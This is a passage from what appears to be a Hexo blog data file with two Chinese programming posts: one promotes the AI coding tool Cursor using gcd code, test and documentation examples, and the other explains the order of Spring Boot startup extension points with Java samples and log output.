a\nelse:\nreturn gcd(b, a % b)\n代码测试：你可以在你的代码编辑器中选中你想要测试的代码，然后输入你的测试目标或者条件，然后按下Ctrl+Enter键，Cursor就会为你生成相应的测试用例和测试代码。例如，你可以选中上面的代码，然后输入“测试函数的正确性和性能”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的测试用例和测试代码：\n\n\nPython\nAI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.\n\n\nimport unittest\nimport timeit\n\nclass TestGcd(unittest.TestCase):\n# 测试gcd函数的正确性和性能\n\ndef test_correctness(self):\n# 测试gcd函数的正确性\nself.assertEqual(gcd(12, 18), 6)\nself.assertEqual(gcd(24, 36), 12)\nself.assertEqual(gcd(17, 23), 1)\n\ndef test_performance(self):\n# 测试gcd函数的性能\nt = timeit.timeit(\"gcd(123456789, 987654321)\", setup=\"from __main__ import gcd\", number=1000)\nprint(f\"Average time for 1000 calls: {t/1000:.6f} seconds\")\n\nif __name__ == \"__main__\":\nunittest.main()\n代码文档：你可以在你的代码编辑器中选中你想要文档化的代码，然后输入你的文档目的或者格式，然后按下Ctrl+Enter键，Cursor就会为你生成相应的文档和注释。例如，你可以选中上面的代码，然后输入“生成Markdown格式的文档”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的文档和注释：\n\n\nPython\nAI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.\n\n\n# gcd函数\n\n## 功能\n\ngcd函数用于计算两个数的最大公约数。\n\n## 参数\n\n- a: 第一个数，必须是整数。\n- b: 第二个数，必须是整数。\n\n## 返回值\n\n返回两个数的最大公约数，是一个整数。\n\n## 示例\n\n```python\n>>> gcd(12, 18)\n6\n>>> gcd(24, 36)\n12\n>>> gcd(17, 23)\n1\n\n```\ngcd函数使用了递归的方式实现，如果两个数较大，可能会导致栈溢出的风险。可以考虑使用循环的方式改进。\n\n\n\nCursor的优势和特点\n\nCursor的优势和特点有：\n\n- 基于人工智能：Cursor使用了最先进的自然语言处理技术，能够理解你的编程意图和需求，并根据你的上下文和目标，生成符合你期望的代码。Cursor不仅可以生成代码，还可以检测和修复代码中的错误，提高代码的质量和效率。Cursor还可以根据你的代码生成相应的文档、注释和测试用例，让你的编程过程更加轻松和高效。\n- 基于文本：Cursor使用了基于文本的交互方式，你只需要通过自然语言或者部分代码来引导Cursor为你生成、修改、测试或者文档化你的代码。你不需要学习任何复杂的语法或者命令，只需要用你熟悉的语言来表达你的编程想法和需求，Cursor就可以为你完成你的编程任务。\n- 基于插件：Cursor使用了基于插件的集成方式，你只需要在你的编程环境中安装Cursor的插件，然后就可以在你的代码编辑器中直接使用Cursor的功能。你不需要切换到任何其他的平台或者工具，只需要在你的代码编辑器中按下Ctrl+Enter键，Cursor就可以为你生成、修改、测试或者文档化你的代码。\n\n![搜索页](./2024/05/26/写代码神器/2.png)\n\n\n\nCursor的未来展望\n\nCursor是一个基于人工智能的编程辅助工具，它可以帮助你快速地生成、修改、优化和测试代码。Cursor使用了最先进的自然语言\n","slug":"写代码神器","published":1,"updated":"2024-05-26T14:20:47.814Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ryd001absuh2mih3ntm","content":"<p>Cursor是一个基于人工智能的编程辅助工具，它可以帮助你快速地生成、修改、优化和测试代码。Cursor使用了最先进的自然语言处理技术，能够理解你的编程意图和需求，并根据你的上下文和目标，生成符合你期望的代码。Cursor不仅可以生成代码，还可以检测和修复代码中的错误，提高代码的质量和效率。Cursor还可以根据你的代码生成相应的文档、注释和测试用例，让你的编程过程更加轻松和高效。</p>\n<p><img src=\"/./2024/05/26/%E5%86%99%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8/1.png\" alt=\"首页\"></p>\n<p>Cursor的用途和优势</p>\n<p>Cursor可以应用于多种编程场景和语言，无论你是一个新手还是一个专家，Cursor都可以为你提供强大的编程支持。Cursor的主要用途和优势有：</p>\n<p>代码生成：Cursor可以根据你的自然语言描述或者部分代码，生成完整的代码片段或者函数。你可以使用Cursor来快速实现你的编程想法，或者填补你的代码空缺。Cursor支持多种编程语言，如Python, Java, C++, JavaScript等，你可以根据你的需要选择合适的语言。</p>\n<p>代码修改：Cursor可以根据你的修改意图和需求，对你的代码进行修改和优化。你可以使用Cursor来修改你的代码逻辑、参数、变量名等，或者对你的代码进行重构、简化和美化。Cursor可以保证修改后的代码的正确性和一致性，避免引入新的错误。</p>\n<p>代码测试：Cursor可以根据你的代码，生成相应的测试用例和测试代码。你可以使用Cursor来测试你的代码的功能、性能、安全性等，或者对你的代码进行覆盖率、静态分析等检查。Cursor可以帮助你提高你的代码的可靠性和稳定性，发现和解决潜在的问题。</p>\n<p>代码文档：Cursor可以根据你的代码，生成相应的文档和注释。你可以使用Cursor来生成你的代码的说明、用法、参数、返回值等，或者对你的代码添加有意义的注释。Cursor可以帮助你提高你的代码的可读性和可维护性，方便你和他人理解和使用你的代码。</p>\n<p><img src=\"/./2024/05/26/%E5%86%99%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8/2.png\" alt=\"编辑页\"></p>\n<p>Cursor的使用方法</p>\n<p>Cursor的使用方法非常简单和方便，你只需要在你的编程环境中安装Cursor的插件，然后就可以通过自然语言或者部分代码来引导Cursor为你生成、修改、测试或者文档化你的代码。Cursor的使用方法如下：</p>\n<p>代码生成：你可以在你的代码编辑器中输入你的自然语言描述或者部分代码，然后按下Ctrl+Enter键，Cursor就会为你生成相应的代码。例如，你可以输入“定义一个Python函数，计算两个数的最大公约数”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的代码：</p>\n<p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p>\n<p>def gcd(a, b):</p>\n<h1 id=\"使用辗转相除法计算两个数的最大公约数\"><a href=\"#使用辗转相除法计算两个数的最大公约数\" class=\"headerlink\" title=\"使用辗转相除法计算两个数的最大公约数\"></a>使用辗转相除法计算两个数的最大公约数</h1><p>while b !&#x3D; 0:<br>a, b &#x3D; b, a % b<br>return a<br>代码修改：你可以在你的代码编辑器中选中你想要修改的代码，然后输入你的修改意图或者需求，然后按下Ctrl+Enter键，Cursor就会为你修改相应的代码。例如，你可以选中上面的代码，然后输入“使用递归的方式实现”，然后按下Ctrl+Enter键，Cursor就会为你修改如下的代码：</p>\n<p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p>\n<p>def gcd(a, b):</p>\n<h1 id=\"使用递归的方式计算两个数的最大公约数\"><a href=\"#使用递归的方式计算两个数的最大公约数\" class=\"headerlink\" title=\"使用递归的方式计算两个数的最大公约数\"></a>使用递归的方式计算两个数的最大公约数</h1><p>if b &#x3D;&#x3D; 0:<br>return a<br>else:<br>return gcd(b, a % b)<br>代码测试：你可以在你的代码编辑器中选中你想要测试的代码，然后输入你的测试目标或者条件，然后按下Ctrl+Enter键，Cursor就会为你生成相应的测试用例和测试代码。例如，你可以选中上面的代码，然后输入“测试函数的正确性和性能”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的测试用例和测试代码：</p>\n<p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p>\n<p>import unittest<br>import timeit</p>\n<p>class TestGcd(unittest.TestCase):</p>\n<h1 id=\"测试gcd函数的正确性和性能\"><a href=\"#测试gcd函数的正确性和性能\" class=\"headerlink\" title=\"测试gcd函数的正确性和性能\"></a>测试gcd函数的正确性和性能</h1><p>def test_correctness(self):</p>\n<h1 id=\"测试gcd函数的正确性\"><a href=\"#测试gcd函数的正确性\" class=\"headerlink\" title=\"测试gcd函数的正确性\"></a>测试gcd函数的正确性</h1><p>self.assertEqual(gcd(12, 18), 6)<br>self.assertEqual(gcd(24, 36), 12)<br>self.assertEqual(gcd(17, 23), 1)</p>\n<p>def test_performance(self):</p>\n<h1 id=\"测试gcd函数的性能\"><a href=\"#测试gcd函数的性能\" class=\"headerlink\" title=\"测试gcd函数的性能\"></a>测试gcd函数的性能</h1><p>t &#x3D; timeit.timeit(“gcd(123456789, 987654321)”, setup&#x3D;”from <strong>main</strong> import gcd”, number&#x3D;1000)<br>print(f”Average time for 1000 calls: {t&#x2F;1000:.6f} seconds”)</p>\n<p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>unittest.main()<br>代码文档：你可以在你的代码编辑器中选中你想要文档化的代码，然后输入你的文档目的或者格式，然后按下Ctrl+Enter键，Cursor就会为你生成相应的文档和注释。例如，你可以选中上面的代码，然后输入“生成Markdown格式的文档”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的文档和注释：</p>\n<p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p>\n<h1 id=\"gcd函数\"><a href=\"#gcd函数\" class=\"headerlink\" title=\"gcd函数\"></a>gcd函数</h1><h2 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h2><p>gcd函数用于计算两个数的最大公约数。</p>\n<h2 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"参数\"></a>参数</h2><ul>\n<li>a: 第一个数，必须是整数。</li>\n<li>b: 第二个数，必须是整数。</li>\n</ul>\n<h2 id=\"返回值\"><a href=\"#返回值\" class=\"headerlink\" title=\"返回值\"></a>返回值</h2><p>返回两个数的最大公约数，是一个整数。</p>\n<h2 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>gcd(<span class=\"number\">12</span>, <span class=\"number\">18</span>)</span><br><span class=\"line\"><span class=\"number\">6</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>gcd(<span class=\"number\">24</span>, <span class=\"number\">36</span>)</span><br><span class=\"line\"><span class=\"number\">12</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>gcd(<span class=\"number\">17</span>, <span class=\"number\">23</span>)</span><br><span class=\"line\"><span class=\"number\">1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>gcd函数使用了递归的方式实现，如果两个数较大，可能会导致栈溢出的风险。可以考虑使用循环的方式改进。</p>\n<p>Cursor的优势和特点</p>\n<p>Cursor的优势和特点有：</p>\n<ul>\n<li>基于人工智能：Cursor使用了最先进的自然语言处理技术，能够理解你的编程意图和需求，并根据你的上下文和目标，生成符合你期望的代码。Cursor不仅可以生成代码，还可以检测和修复代码中的错误，提高代码的质量和效率。Cursor还可以根据你的代码生成相应的文档、注释和测试用例，让你的编程过程更加轻松和高效。</li>\n<li>基于文本：Cursor使用了基于文本的交互方式，你只需要通过自然语言或者部分代码来引导Cursor为你生成、修改、测试或者文档化你的代码。你不需要学习任何复杂的语法或者命令，只需要用你熟悉的语言来表达你的编程想法和需求，Cursor就可以为你完成你的编程任务。</li>\n<li>基于插件：Cursor使用了基于插件的集成方式，你只需要在你的编程环境中安装Cursor的插件，然后就可以在你的代码编辑器中直接使用Cursor的功能。你不需要切换到任何其他的平台或者工具，只需要在你的代码编辑器中按下Ctrl+Enter键，Cursor就可以为你生成、修改、测试或者文档化你的代码。</li>\n</ul>\n<p><img src=\"/./2024/05/26/%E5%86%99%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8/2.png\" alt=\"搜索页\"></p>\n<p>Cursor的未来展望</p>\n<p>Cursor是一个基于人工智能的编程辅助工具，它可以帮助你快速地生成、修改、优化和测试代码。Cursor使用了最先进的自然语言</p>\n","cover":"/img/haibian.png","cover_type":"img","excerpt":"","more":"<p>Cursor是一个基于人工智能的编程辅助工具，它可以帮助你快速地生成、修改、优化和测试代码。Cursor使用了最先进的自然语言处理技术，能够理解你的编程意图和需求，并根据你的上下文和目标，生成符合你期望的代码。Cursor不仅可以生成代码，还可以检测和修复代码中的错误，提高代码的质量和效率。Cursor还可以根据你的代码生成相应的文档、注释和测试用例，让你的编程过程更加轻松和高效。</p>\n<p><img src=\"/./2024/05/26/%E5%86%99%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8/1.png\" alt=\"首页\"></p>\n<p>Cursor的用途和优势</p>\n<p>Cursor可以应用于多种编程场景和语言，无论你是一个新手还是一个专家，Cursor都可以为你提供强大的编程支持。Cursor的主要用途和优势有：</p>\n<p>代码生成：Cursor可以根据你的自然语言描述或者部分代码，生成完整的代码片段或者函数。你可以使用Cursor来快速实现你的编程想法，或者填补你的代码空缺。Cursor支持多种编程语言，如Python, Java, C++, JavaScript等，你可以根据你的需要选择合适的语言。</p>\n<p>代码修改：Cursor可以根据你的修改意图和需求，对你的代码进行修改和优化。你可以使用Cursor来修改你的代码逻辑、参数、变量名等，或者对你的代码进行重构、简化和美化。Cursor可以保证修改后的代码的正确性和一致性，避免引入新的错误。</p>\n<p>代码测试：Cursor可以根据你的代码，生成相应的测试用例和测试代码。你可以使用Cursor来测试你的代码的功能、性能、安全性等，或者对你的代码进行覆盖率、静态分析等检查。Cursor可以帮助你提高你的代码的可靠性和稳定性，发现和解决潜在的问题。</p>\n<p>代码文档：Cursor可以根据你的代码，生成相应的文档和注释。你可以使用Cursor来生成你的代码的说明、用法、参数、返回值等，或者对你的代码添加有意义的注释。Cursor可以帮助你提高你的代码的可读性和可维护性，方便你和他人理解和使用你的代码。</p>\n<p><img src=\"/./2024/05/26/%E5%86%99%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8/2.png\" alt=\"编辑页\"></p>\n<p>Cursor的使用方法</p>\n<p>Cursor的使用方法非常简单和方便，你只需要在你的编程环境中安装Cursor的插件，然后就可以通过自然语言或者部分代码来引导Cursor为你生成、修改、测试或者文档化你的代码。Cursor的使用方法如下：</p>\n<p>代码生成：你可以在你的代码编辑器中输入你的自然语言描述或者部分代码，然后按下Ctrl+Enter键，Cursor就会为你生成相应的代码。例如，你可以输入“定义一个Python函数，计算两个数的最大公约数”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的代码：</p>\n<p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p>\n<p>def gcd(a, b):</p>\n<h1 id=\"使用辗转相除法计算两个数的最大公约数\"><a href=\"#使用辗转相除法计算两个数的最大公约数\" class=\"headerlink\" title=\"使用辗转相除法计算两个数的最大公约数\"></a>使用辗转相除法计算两个数的最大公约数</h1><p>while b !&#x3D; 0:<br>a, b &#x3D; b, a % b<br>return a<br>代码修改：你可以在你的代码编辑器中选中你想要修改的代码，然后输入你的修改意图或者需求，然后按下Ctrl+Enter键，Cursor就会为你修改相应的代码。例如，你可以选中上面的代码，然后输入“使用递归的方式实现”，然后按下Ctrl+Enter键，Cursor就会为你修改如下的代码：</p>\n<p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p>\n<p>def gcd(a, b):</p>\n<h1 id=\"使用递归的方式计算两个数的最大公约数\"><a href=\"#使用递归的方式计算两个数的最大公约数\" class=\"headerlink\" title=\"使用递归的方式计算两个数的最大公约数\"></a>使用递归的方式计算两个数的最大公约数</h1><p>if b &#x3D;&#x3D; 0:<br>return a<br>else:<br>return gcd(b, a % b)<br>代码测试：你可以在你的代码编辑器中选中你想要测试的代码，然后输入你的测试目标或者条件，然后按下Ctrl+Enter键，Cursor就会为你生成相应的测试用例和测试代码。例如，你可以选中上面的代码，然后输入“测试函数的正确性和性能”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的测试用例和测试代码：</p>\n<p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p>\n<p>import unittest<br>import timeit</p>\n<p>class TestGcd(unittest.TestCase):</p>\n<h1 id=\"测试gcd函数的正确性和性能\"><a href=\"#测试gcd函数的正确性和性能\" class=\"headerlink\" title=\"测试gcd函数的正确性和性能\"></a>测试gcd函数的正确性和性能</h1><p>def test_correctness(self):</p>\n<h1 id=\"测试gcd函数的正确性\"><a href=\"#测试gcd函数的正确性\" class=\"headerlink\" title=\"测试gcd函数的正确性\"></a>测试gcd函数的正确性</h1><p>self.assertEqual(gcd(12, 18), 6)<br>self.assertEqual(gcd(24, 36), 12)<br>self.assertEqual(gcd(17, 23), 1)</p>\n<p>def test_performance(self):</p>\n<h1 id=\"测试gcd函数的性能\"><a href=\"#测试gcd函数的性能\" class=\"headerlink\" title=\"测试gcd函数的性能\"></a>测试gcd函数的性能</h1><p>t &#x3D; timeit.timeit(“gcd(123456789, 987654321)”, setup&#x3D;”from <strong>main</strong> import gcd”, number&#x3D;1000)<br>print(f”Average time for 1000 calls: {t&#x2F;1000:.6f} seconds”)</p>\n<p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>unittest.main()<br>代码文档：你可以在你的代码编辑器中选中你想要文档化的代码，然后输入你的文档目的或者格式，然后按下Ctrl+Enter键，Cursor就会为你生成相应的文档和注释。例如，你可以选中上面的代码，然后输入“生成Markdown格式的文档”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的文档和注释：</p>\n<p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p>\n<h1 id=\"gcd函数\"><a href=\"#gcd函数\" class=\"headerlink\" title=\"gcd函数\"></a>gcd函数</h1><h2 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h2><p>gcd函数用于计算两个数的最大公约数。</p>\n<h2 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"参数\"></a>参数</h2><ul>\n<li>a: 第一个数，必须是整数。</li>\n<li>b: 第二个数，必须是整数。</li>\n</ul>\n<h2 id=\"返回值\"><a href=\"#返回值\" class=\"headerlink\" title=\"返回值\"></a>返回值</h2><p>返回两个数的最大公约数，是一个整数。</p>\n<h2 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>gcd(<span class=\"number\">12</span>, <span class=\"number\">18</span>)</span><br><span class=\"line\"><span class=\"number\">6</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>gcd(<span class=\"number\">24</span>, <span class=\"number\">36</span>)</span><br><span class=\"line\"><span class=\"number\">12</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>gcd(<span class=\"number\">17</span>, <span class=\"number\">23</span>)</span><br><span class=\"line\"><span class=\"number\">1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>gcd函数使用了递归的方式实现，如果两个数较大，可能会导致栈溢出的风险。可以考虑使用循环的方式改进。</p>\n<p>Cursor的优势和特点</p>\n<p>Cursor的优势和特点有：</p>\n<ul>\n<li>基于人工智能：Cursor使用了最先进的自然语言处理技术，能够理解你的编程意图和需求，并根据你的上下文和目标，生成符合你期望的代码。Cursor不仅可以生成代码，还可以检测和修复代码中的错误，提高代码的质量和效率。Cursor还可以根据你的代码生成相应的文档、注释和测试用例，让你的编程过程更加轻松和高效。</li>\n<li>基于文本：Cursor使用了基于文本的交互方式，你只需要通过自然语言或者部分代码来引导Cursor为你生成、修改、测试或者文档化你的代码。你不需要学习任何复杂的语法或者命令，只需要用你熟悉的语言来表达你的编程想法和需求，Cursor就可以为你完成你的编程任务。</li>\n<li>基于插件：Cursor使用了基于插件的集成方式，你只需要在你的编程环境中安装Cursor的插件，然后就可以在你的代码编辑器中直接使用Cursor的功能。你不需要切换到任何其他的平台或者工具，只需要在你的代码编辑器中按下Ctrl+Enter键，Cursor就可以为你生成、修改、测试或者文档化你的代码。</li>\n</ul>\n<p><img src=\"/./2024/05/26/%E5%86%99%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8/2.png\" alt=\"搜索页\"></p>\n<p>Cursor的未来展望</p>\n<p>Cursor是一个基于人工智能的编程辅助工具，它可以帮助你快速地生成、修改、优化和测试代码。Cursor使用了最先进的自然语言</p>\n"},{"title":"一张长图透彻理解SpringBoot启动原理","date":"2024-06-16T14:04:29.000Z","_content":"\n虽然Java程序员大部分工作都是CRUD，但是工作中常用的中间件必须和Spring集成，如果不知道Spring的原理，很难理解这些中间件和框架的原理。\n\n一张长图透彻解释 Spring启动顺序\n-------------------\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/1.png)\n\n测试对Spring启动原理的理解程度\n------------------\n\n我举个例子，测试一下，你对Spring启动原理的理解程度。\n\n*   Rpc框架和Spring的集成问题。Rpc框架何时注册暴露服务，在哪个Spring扩展点注册呢？init-method 中行不行？\n\n*   MQ 消费组和Spring的集成问题。MQ消费者何时开始消费，在哪个Spring扩展点”注册“自己？init-method 中行不行？\n\n*   SpringBoot 集成Tomcat问题。如果出现已开启Http流量，Spring还未启动完成，怎么办？Tomcat何时开启端口，对外服务？\n\n\nSpringBoot项目常见的流量入口无外乎 Rpc、Http、MQ 三种方式。一名合格的架构师必须精通服务的入口流量何时开启，如何正确开启？最近我遇到的两次线上故障都和Spring启动过程相关。\n\n故障的具体表现是：Kafka消费组已经开始消费，已开启流量，然而Spring 还未启动完成。因为业务代码中使用的Spring Event事件订阅组件还未启动（订阅者还未注册到Spring），所以处理异常，出了线上故障。根本原因是————项目在错误的时机开启 MQ 流量，然而Spring还未启动完成，导致出现故障。\n\n正确的做法是：项目在Spring启动完成后开启入口流量，然而我司的Kafka消费组 在Spring `init-method bean` 实例化阶段就开启了流量，导致故障发生。出现这样的问题，说明项目初期的程序员没有深入理解Spring的启动原理。\n\n接下来，我再次抛出 11 个问题，说明这个问题————深入理解Spring启动原理的重要性。\n\n**1、** Spring还未完全启动，在`PostConstruct`中调用`getBeanByAnnotation`能否获得准确的结果？；  \n**2、** 项目应该如何监听Spring的启动就绪事件？；  \n**3、** 项目如何监听Spring刷新事件？；  \n**4、** Spring就绪事件和刷新事件的执行顺序和区别？；  \n**5、** Http流量入口何时启动完成？；  \n**6、** 项目中在`init-method`方法中注册Rpc是否合理？什么是合理的时机？；  \n**7、** 项目中在`init-method`方法中注册MQ消费组是否合理？什么是合理的时机？；  \n**8、** `PostConstruct`中方法依赖`ApplicationContextAware`拿到`ApplicationContext`，两者的顺序谁先谁后？是否会出现空指针!；  \n**9、** `init-method`、`PostConstruct`、`afterPropertiesSet`三个方法的执行顺序?；  \n**10、** 有两个Bean声明了初始化方法A使用`PostConstruct`注解声明，B使用`init-method`声明Spring一定先执行A的`PostConstruct`方法吗？；  \n**11、** Spring何时装配Autowire属性，`PostConstruct`方法中引用Autowired字段什么场景会空指针?；\n\n精通Spring 启动原理，以上问题则迎刃而解。接下来，大家一起学习Spring的启动原理，看看Spring的扩展点分别在何时执行。\n\n一起数数 Spring启动过程的扩展点有几个？\n-----------------------\n\nSpring的扩展点极多，这里为了讲清楚启动原理，所以只列举和启动过程有关的扩展点。\n\n**1、** `BeanFactoryAware`可在Bean中获取`BeanFactory`实例；  \n**2、** `ApplicationContextAware`可在Bean中获取`ApplicationContext`实例；  \n**3、** `BeanNameAware`可以在Bean中得到它在IOC容器中的Bean的实例的名字；  \n**4、** `ApplicationListener`可监听`ContextRefreshedEvent`等；  \n**5、** `CommandLineRunner`整个项目启动完毕后，自动执行；  \n6\\.  SmartLifecycle#start 在Spring Bean实例化完成后，执行start 方法。**7、** 使用`@PostConstruct`注解，用于Bean实例初始化；  \n**8、** 实现`InitializingBean`接口，用于Bean实例初始化；  \n**9、** xml中声明`init-method`方法，用于Bean实例初始化；  \n**10、** `Configuration`配置类通过@Bean注解注册Bean到Spring；  \n**11、** `BeanPostProcessor`在Bean的初始化前后，植入扩展点！；  \n**12、** `BeanFactoryPostProcessor`在`BeanFactory`创建后植入扩展点！；\n\n通过打印日志学习Spring的执行顺序\n-------------------\n\n首先我们先通过 代码实验，验证一下以上扩展点的执行顺序。\n\n**1、** 声明`TestSpringOrder`分别继承以下接口，并且在接口方法实现中，日志打印该接口的名称；\n\n```\npublic class TestSpringOrder implements  \n      ApplicationContextAware,  \n      BeanFactoryAware,   \n      InitializingBean,   \n      SmartLifecycle,   \n      BeanNameAware,   \n      ApplicationListener<ContextRefreshedEvent>,   \n      CommandLineRunner,  \n      SmartInitializingSingleton {  \n  \n\n```\n```\n@Override  \npublic void afterPropertiesSet() throws Exception {  \n   log.error(\"启动顺序:afterPropertiesSet\");  \n}  \n  \n@Override  \npublic void setApplicationContext(ApplicationContext applicationContext) throws BeansException {  \n   log.error(\"启动顺序:setApplicationContext\");  \n}  \n  \n\n```\n\n**2、** `TestSpringOrder`使用`PostConstruct`注解初始化，声明`init-method`方法初始化；\n\n```\n@PostConstruct  \npublic void postConstruct() {  \n   log.error(\"启动顺序:post-construct\");  \n}  \n  \npublic void initMethod() {  \n   log.error(\"启动顺序:init-method\");  \n}  \n  \n\n```\n\n**3、** 新建`TestSpringOrder2`继承；\n\n```\npublic class TestSpringOrder3 implements  \n         BeanPostProcessor,   \n         BeanFactoryPostProcessor {  \n   @Override  \n   public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {  \n      log.error(\"启动顺序:BeanPostProcessor postProcessBeforeInitialization beanName:{}\", beanName);  \n      return bean;  \n   }  \n  \n   @Override  \n   public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException {  \n      log.error(\"启动顺序:BeanPostProcessor postProcessAfterInitialization beanName:{}\", beanName);  \n      return bean;  \n   }  \n  \n   @Override  \n   public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException {  \n      log.error(\"启动顺序:BeanFactoryPostProcessor postProcessBeanFactory \");  \n   }  \n}  \n  \n\n```\n\n执行以上代码后，可以在日志中看到启动顺序！\n\n#### 实际的执行顺序\n\n```\n2023-11-25 18:10:53,748 [main] ERROR (TestSpringOrder3:37) - 启动顺序:BeanFactoryPostProcessor postProcessBeanFactory   \n2023-11-25 18:10:59,299 [main] ERROR (TestSpringOrder:53) - 启动顺序:构造函数 TestSpringOrder  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:127) - 启动顺序: Autowired  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:129) - 启动顺序:setBeanName  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:111) - 启动顺序:setBeanFactory  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:121) - 启动顺序:setApplicationContext  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder3:25) - 启动顺序:BeanPostProcessor postProcessBeforeInitialization beanName:testSpringOrder  \n2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:63) - 启动顺序:post-construct  \n2023-11-25 18:10:59,317 [main] ERROR (TestSpringOrder:116) - 启动顺序:afterPropertiesSet  \n2023-11-25 18:10:59,317 [main] ERROR (TestSpringOrder:46) - 启动顺序:init-method  \n2023-11-25 18:10:59,320 [main] ERROR (TestSpringOrder3:31) - 启动顺序:BeanPostProcessor postProcessAfterInitialization beanName:testSpringOrder  \n2023-11-25 18:17:21,563 [main] ERROR (SpringOrderConfiguartion:21) - 启动顺序: @Bean 注解方法执行  \n2023-11-25 18:17:21,668 [main] ERROR (TestSpringOrder:58) - 启动顺序:SmartInitializingSingleton  \n2023-11-25 18:17:21,675 [main] ERROR (TestSpringOrder:74) - 启动顺序:start  \n2023-11-25 18:17:23,508 [main] ERROR (TestSpringOrder:68) - 启动顺序:ContextRefreshedEvent  \n2023-11-25 18:17:23,574 [main] ERROR (TestSpringOrder:79) - 启动顺序:CommandLineRunner  \n  \n\n```\n\n我通过在以上扩展点 添加 debug 断点，调试代码，整理出 Spring启动原理的 长图。过程省略…………\n\n一张长图透彻解释 Spring启动顺序\n-------------------\n\n![](./2024/06/16/一张长图透彻理解SpringBoot启动原理/2.png)\n#### 实例化和初始化的区别\n\n`new TestSpringOrder()`：new 创建对象实例，即为实例化一个对象；执行该Bean的 `init-method` 等方法 为初始化一个Bean。注意初始化和实例化的区别。\n\nSpring 重要扩展点的启动顺序\n-----------------\n\n**1.BeanFactoryPostProcessor**\n\nBeanFactory初始化之后，所有的Bean定义已经被加载，但Bean实例还没被创建（不包括`BeanFactoryPostProcessor`类型）。Spring IoC容器允许`BeanFactoryPostProcessor`读取配置元数据，修改bean的定义，Bean的属性值等。\n\n**2.实例化Bean**\n\nSpring 调用java反射API 实例化 Bean。等同于 `new TestSpringOrder()`;\n\n**3.Autowired 装配依赖**\n\nAutowired是 借助于 `AutowiredAnnotationBeanPostProcessor` 解析 Bean 的依赖，装配依赖。如果被依赖的Bean还未初始化，则先初始化 被依赖的Bean。在 Bean实例化完成后，Spring将首先装配Bean依赖的属性。\n\n**4.BeanNameAware**\n\n`setBeanName`\n\n**5.BeanFactoryAware**\n\n`setBeanFactory`\n\n**6.ApplicationContextAware setApplicationContext**\n\n在Bean实例化前，会率先设置Aware接口，例如 `BeanNameAware` `BeanFactoryAware` `ApplicationContextAware` 等\n\n**7.BeanPostProcessor postProcessBeforeInitialization**\n\n如果我想在 bean初始化方法前后要添加一些自己逻辑处理。可以提供 `BeanPostProcessor`接口实现类，然后注册到Spring IoC容器中。在此接口中，可以创建Bean的代理，甚至替换这个Bean。\n\n**8.PostConstruct 执行**\n\n接下来Spring会依次调用 Bean实例初始化的 三大方法。\n\n**9.InitializingBean**\n\n`afterPropertiesSet`\n\n**10.init-method**\n\n方法执行\n\n**11.BeanPostProcessor postProcessAfterInitialization**\n\n在Spring 对Bean的初始化方法执行完成后，执行该方法\n\n**12.其他Bean 实例化和初始化**\n\nSpring 会循环初始化Bean。直至所有的单例Bean都完成初始化\n\n**13.所有单例Bean 初始化完成后**\n\n**14.SmartInitializingSingleton Bean实例化后置处理**\n\n该接口的执行时机在 所有的单例Bean执行完成后。例如Spring 事件订阅机制的 `EventListener`注解，所有的订阅者 都是 在这个位置被注册进 